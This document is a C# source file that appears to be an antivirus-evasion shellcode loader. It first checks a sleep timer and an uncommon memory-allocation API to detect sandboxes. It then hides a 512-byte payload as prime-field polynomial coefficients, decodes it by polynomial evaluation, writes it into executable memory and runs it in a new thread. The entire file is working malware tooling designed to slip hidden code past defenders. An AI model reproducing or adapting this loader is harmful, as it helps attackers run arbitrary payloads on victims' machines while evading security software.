using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Numerics;

namespace ConsoleApp1
{
	public class Program
	{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		
		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
			
		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);
		
		public static void runner()
		{

            // Root of unity assuming Goldilocks prime field and 512 length shellcode
            BigInteger field_modulus = 18446744069414584321;
            BigInteger root_of_unity = 4545880015766881148;

			// Exit if "time skip" is satisfied.
			DateTime t1 = DateTime.Now;
			Sleep(4000);
			double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

            if(t2 < 3.5)
			{
				return;
			}

			// Exit if VirtualAllocExNuma is not recognized by heuristic.
			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
				return;
			}

            BigInteger[] poly = new BigInteger[512] {1116892707327836272, 16291728375472044792, 13172085788257719837, 10409193508924530774, 17485503139674668614, 10781639492496017642, 10860648998042355486, 438279154146056944, 13515737738508920403, 15839698519303213477, 8330280405637382718, 16875406921784664576, 17173463876419237756, 12823492786837701239, 142839877501344038, 5514254401689249859, 1541689351858781886, 12886651085903572337, 18165533914919245434, 1774184839074243321, 852437410373489686, 3598484110736580932, 4893807173273770430, 16076722430193981474, 15683134003745602671, 1085525648315328739, 8150727242042336504, 11485138098008421084, 319239859060225942, 14807766064647631065, 13799913522666493895, 3637830758320353550, 14170856754451945699, 8176527246829291240, 7125183337371491671, 17020757424024472457, 6801762801365369011, 17304134655166089599, 14231260190787521631, 14392412130947577449, 18352252034531855350, 9638101062929237854, 14658064524635606693, 5915299784684997765, 10020545405609459301, 13243190180209089630, 5393487649727609670, 14841100297265528687, 10530965821041003139, 11077653796564651016, 6163937891334633376, 1902173615359976713, 11118017363172245409, 5268725226226684611, 10123363520224542622, 11902224496765838079, 9736551432738120499, 17884244465149185558, 17497557687791953479, 2456564259452467725, 17251670464210902689, 11498525753191386509, 10997935096713380686, 13940547763704346689, 11241258166571991106, 8204318361925588054, 11588458387099661940, 13669008446602853503, 4919184202893939417, 2890215320407621300, 12106179466656526480, 8025703384233294127, 8072719835876325859, 12687063047229501548, 11148511413893536087, 11838725357081718864, 11322580227403620534, 8596550788933216342, 4519796976772448392, 5491640250215104864, 4012658550861962988, 4066914344050410925, 13497931685552046244, 17848116595470527042, 16880230897443360359, 1547142814557266322, 3519318603625097954, 640815347964982213, 762002948831038477, 5207820834517980810, 7315371857265274974, 18282059365502292718, 5874327532267579018, 12783301302233034637, 12637906941045597893, 1069624705140365060, 16643423098961207367, 13878535172934216252, 7518503138430447296, 12188722361530597310, 10242118962989170415, 2824969343866784046, 14167073701956029040, 9124014563751630125, 15500983388119755076, 5667307263756282101, 5552628626300874193, 3955199279524290415, 17906524595385271149, 12871804843997906358, 12496668662888489318, 8342598213481295044, 9624091926954053995, 3472946188978849005, 707843814243693019, 6500437767794348379, 15110850470096899405, 10224494408469488254, 13555956766051035560, 9216150222302156209, 1754318703760800771, 817794856236519398, 8894309906400712400, 6214622468848723529, 10133674450550201567, 14272151487243789447, 10866920144273892753, 11726972258829475427, 2448909812382040065, 1017930039145591674, 15980464899725247832, 2984013478078539609, 1398085593474706785, 7026500785996438803, 8473649605154268842, 13194668131114760593, 4228302709637671415, 14800785596278122640, 6212123908157155472, 14533445222843688344, 12672935544125228638, 5546099429978048504, 3682129834291442499, 5215865490221558507, 5091231654033609187, 5368423242957659306, 12229651456153941324, 7648113897919555663, 1349983805003917778, 17007992464973058743, 1900481505907831534, 13485189260916455396, 15377283204438841851, 11651513470850336753, 3781830401230684417, 8768959896323966411, 6807594957897512350, 5619550708450233317, 15187197342711833386, 18304246267724139079, 15354599504059246484, 10354316611230109451, 17053357601401864977, 12421042719024698873, 11086023590586672006, 14067471935754877161, 1007640432803173637, 6990760784158811365, 4391753747310063817, 7056490868089856611, 11269873914982220616, 5436170528202449920, 15886826754907121353, 17151182364720148181, 2473280800322847681, 2350331700094210433, 10120166487505047000, 11771534854075572697, 976433552446120283, 7357928268934503661, 8238945410571179026, 11533875184104972762, 9810014075467416555, 2462036461983284346, 13311850317163428060, 76147899545299129, 7226862069203275027, 13636143743253778804, 12166036433511508394, 17183447427047519556, 6635476663524294264, 5674556274665354590, 2017342133400173829, 13159447110214079046, 14089176016371775143, 17487495746893473708, 8318237789575944888, 10571307732306196670, 7287715551994835261, 17555575966587362866, 14754376259794908325, 10240915203641127005, 1585941272440356126, 161792266224660852, 4699966490737330951, 14481968181144177292, 12942363247144281549, 1663447383437314936, 12827923377559812750, 11161717974589048043, 17871468490377001310, 15611320325345423750, 9038843246968476110, 10360399511563274428, 15083178075343025404, 14983685267941115923, 17875628951113645716, 6151965263518984160, 7457312366002858959, 10495456690818204210, 15762796183054759574, 2918278271828245349, 933256907959582741, 17313426803175126709, 14671312305192600328, 8212025334298605691, 14761994554676456752, 11632214332845680073, 18375557916553023856, 15364759581226792717, 2547323866979175676, 2935744146188920422, 13159744261851963792, 11406976134799949880, 9635070034498923936, 14964119969357666680, 6985658555485077876, 2811281048711661794, 15955865767848995933, 1035874550369620639, 9302973823756568110, 7114846206856224950, 4508899539522122844, 5474115474532299868, 3496569272972253207, 775714657641169319, 12508550195945986199, 12998012517240102764, 10852324902407471325, 4722305120104698671, 15402660591795078536, 8740809799340997718, 8851682304027637576, 5875612415688987038, 13318483192783248646, 18168509250480424710, 7818248951294853119, 8813117090557081743, 15237932804907138859, 120719723148499821, 9186276627236756725, 6092043649113553931, 3588190265693606666, 5644085900040068415, 369130245708035352, 11335894721187794269, 8546452079415286951, 17565415254683715550, 18258316454137889735, 11594071278902142934, 3094264685323257213, 11213913950124182103, 16771186102587560455, 5247583230672453633, 7744838375432728293, 11980558806460248944, 6701864746611142446, 8587250028263628563, 6307870847046884856, 6973492350040158391, 9333204838925686136, 8819391228855431015, 4872596506308349321, 17181660454819352218, 5668489816639257979, 3419880784574635569, 5955531616917134124, 10993136209659869495, 16380488170400343747, 10554792899951160911, 2826718122414569751, 4661380039718744534, 8420411474387696424, 17812733509832010512, 13447215670223098428, 2194444571432492720, 3354988797068366848, 6987385189947517610, 8430920702694352314, 7312763684074838197, 8158492068843505338, 1210477890487092991, 12849927303480616326, 3658348353291920297, 8814816345302831100, 7516455810219374982, 14427837313713248975, 2822416848992237326, 15953894545902695627, 17446852519173397634, 10506319897861124645, 18267050590297961909, 2837712665185418607, 1005244958386903047, 13963062411296999583, 6176565528923835111, 14034983117026025984, 18076806115511605700, 9649795489580189753, 11084535974726266539, 11241258724817665984, 1992753951907662944, 8083349239629280222, 16471399387285923036, 8264580002556452530, 12462489888382897187, 694540858382126766, 3204808258468537787, 13846047338383778705, 1299733833546500473, 15500516949116682325, 11505573089841503233, 14863348867093385732, 15028716016037354601, 2594390350486730846, 17512029113221416187, 14976972784399583747, 4890125436942712046, 8585255212873126798, 7266208157425929620, 11317080860825900020, 12609407723754071478, 5101724359380960149, 10517909495336761689, 3515598282862504870, 10448497213571572192, 6212531489008666746, 11081184585568065544, 3756049451128320202, 9759829485463784374, 4860948302761383450, 7693815108089142837, 13910072367557369719, 4187153869779582380, 8618063632001769463, 862204940882362525, 11102930479592802046, 1316277724459862953, 1317785355145751184, 15007557298870934313, 15988817077457517348, 9728405306817234145, 12010290673966452828, 13008007234765651203, 1986892034957726831, 2521626421352280138, 13090800561100643319, 14017904052856745381, 12227331349016887658, 9342606005200622585, 8131822736411727302, 3680946077621655743, 2758469351140755047, 4725101402951606836, 11437452583800847777, 4219259704006548117, 11110798856659194157, 12799681449400002729, 16374850539240948130, 6138995349295716672, 3196454839453862179, 5079142514539442264, 2234481539514708048, 11201515855572375232, 2451006581056208897, 12122431349543707161, 11639720171540064519, 13938507678674760591, 3536817217000712350, 5435927005496126544, 13323235596694250993, 4187120456676645073, 13554833447802496474, 6530854009447764828, 7558692173146788787, 9470947768961360194, 7286058906533289925, 7716172311350387457, 6402997036999033125, 15113851651261368083, 12336404524603383650, 1714887168237259888, 249739799568804690, 11422327979559430184, 6006348182649645499, 14199624317835236228, 5662715515715470270, 9057266063563429959, 7282236750244657651, 14874972269746849556, 2239363782263057655, 4418055059129779727, 14830764698455346005, 5018166479856476141, 3469426849188960470, 1658602623906812852, 15196744656280344772, 14953515184972908733, 10325383747796888281, 8087544484224699178, 9088697767763612168, 11313511997951725355, 16575939732431627402, 3454554421918968398, 6851717249607021993, 5283634919237026029, 1990860933036547255, 5955526492520371737, 17003760067208610130, 7853029431958989840, 5524154790521059293, 18154741037078700789, 6274667072084122375, 10188250533153092450, 13577907756855237611, 16613215742801168720, 8726353694040435036, 2361220915802016176, 12154580786040998522, 17375723329287024301, 5337208820190545170, 15966960212243173169, 14064261454162699832, 6868414411910159058, 7785871531169833693, 1339524666990747829, 8167215174468222848, 18414664221894798549, 2017335574993634044, 6575103149491273604, 12842391108238759395, 13579243227191388068, 14173361087480294486, 8621106180655995923, 9245246998475614556, 8010305914554844265, 13804355728409705124, 18358866302472311994, 10635319022363128700, 11974877979042833171, 17468439663990047842, 6890969394361416767, 17510738339840182063, 15971615144595033135, 3922961369960553089, 11448050239975974343, 15725471714598049318, 11030812418623613357, 13978746385093622665, 16461668534820433364, 15610618221179247931, 2929579635414854734, 12316737374256700941, 6384331491516465248, 710634647765992979, 7475851870062012931, 11896718133956211681, 6530602045429639751, 3385467291072739040, 16366688634272394720, 15882182602968563000, 12828813594558038086, 13710616931014131451, 17482924700147303178, 2295389811536006542, 3661179117755785917, 17797770679792976858, 16268050783798277004, 4545229052713434033, 14610004120171185771, 8912806166597554753, 15754179931494413498, 18334790031783186047, 11095601864509741345, 3336991765836970088, 6941035228731512900, 4586225996437267367, 12084572405291679398, 3749058237576326997, 11618515933903245935, 13166302958988057567, 7322470981442091312, 9149049233480317315, 1382918367753184076, 8758303701727222083, 4883072317279005870, 17851253507790700157, 1060285229784899341, 6351997002575258974, 6178548927811825505, 12992292135446880845, 4425911386876069183};
			byte[] fin = new byte[512];
            
            int size = poly.Length;

            // No FFT = no multipoint eval = O(n^2). Don't want to make a sloppy BigInteger NTT and did not immediately find some prime field library in C#.
            BigInteger omega = 1;
            BigInteger inner_omega = 1;
            for (int i = 0; i < size; i++) {
                BigInteger result = poly[0];
                inner_omega = omega;
                for (int j = 1; j < size; j++) {
                    result = (result + ((inner_omega * poly[j]) % field_modulus)) % field_modulus;
                    inner_omega = (inner_omega * omega) % field_modulus;
                }
                omega = (omega * root_of_unity) % field_modulus;
                fin[i] = (byte)result;
            }

			IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
			Marshal.Copy(fin, 0, addr, size);
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

			WaitForSingleObject(hThread, 0xFFFFFFFF);
		}
    }
}
